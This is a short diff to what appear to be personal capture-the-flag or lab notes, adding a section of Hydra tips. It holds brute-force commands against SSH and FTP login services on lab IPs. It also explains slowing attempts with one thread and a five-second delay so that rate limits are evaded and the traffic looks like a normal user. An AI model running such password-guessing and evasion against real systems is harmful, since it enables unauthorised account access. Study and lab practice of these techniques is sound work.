@@ -346,6 +346,16 @@ So, I create .reminder and save that sup3r_p@s$w0rd! > after that run that code
 Finally, brutefroce the password with hydra
 --------------------------------------------
 #hydra -l blue -P passlist.txt ssh://$IP
+
+Hydra tips and tricks
+----------------------
+Some services they determine rate limitation for bruteforcing, that's why we have to do threds and delay
+
+#hydra -l "fiona" -P /usr/share/wordlists/rockyou.txt -t 1 -w 5 -f ftp://10.129.203.7
+
+-t 1 = 1 thread (one login attempt at a time instead of 16 in parallel)
+-w 5 = wait 5 seconds between each attempt
+Slows it down so it looks like a normal user, not a bot. 
 _________________________________________________________________________________________________________________________________________________________________________________________________
 
 
